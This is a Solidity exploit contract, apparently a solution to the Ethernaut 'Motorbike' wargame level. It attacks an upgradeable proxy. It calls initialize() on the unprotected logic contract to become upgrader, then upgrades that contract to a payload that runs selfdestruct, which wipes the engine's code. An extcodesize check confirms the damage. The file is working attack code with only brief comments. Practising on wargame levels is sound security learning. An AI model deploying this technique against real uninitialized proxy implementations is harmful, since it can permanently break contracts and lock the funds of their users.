// SPDX-License-Identifier: UNLICENSED
pragma solidity <0.7.0;

import "../src/Motorbike.sol";

contract Sabotage {

    Motorbike instance;
    Engine engine;
    
    constructor(address payable $your_ethernaut_instance_here, address $your_sleuthed_logic_engine_here) public {
        instance = Motorbike($your_ethernaut_instance_here);
        engine = Engine($your_sleuthed_logic_engine_here);
    }

    function sugarInYourEngine() public {
        // become upgrader by initializing logic engine
        engine.initialize();
        engine.upgradeToAndCall(address(this), abi.encodeWithSignature("payload()"));
    }

    function payload() public {
        selfdestruct(0x000000000000000000000000000000000000dEaD);
    }

    // this function may not actually return 0 even if the engine is successfully self destructed in the case that it is called within the same tx; call it in a separate tx
    function inspectDamage() public returns (uint) {
        uint256 size;
        address _engine = address(engine);
        assembly {
            size := extcodesize(_engine)
        }
        return size;
    }
}
